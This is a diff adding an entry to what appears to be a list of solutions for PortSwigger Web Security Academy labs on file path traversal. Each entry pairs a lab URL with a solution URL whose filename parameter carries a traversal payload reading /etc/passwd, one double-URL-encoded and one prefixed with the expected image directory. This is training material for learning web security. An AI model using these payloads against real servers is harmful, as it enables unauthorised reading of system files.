@@ -14,3 +14,6 @@ solution: https://accc1f791f37f46480fe243200a500f4.web-security-academy.net/imag
 url: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
 solution: https://acd01f3f1fe67b0280c6368000a10004.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd
 
+[lab: File path traversal, validation of start of path]
+url: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
+solution: https://ac431fd31f304d1880ba153b002d00ce.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
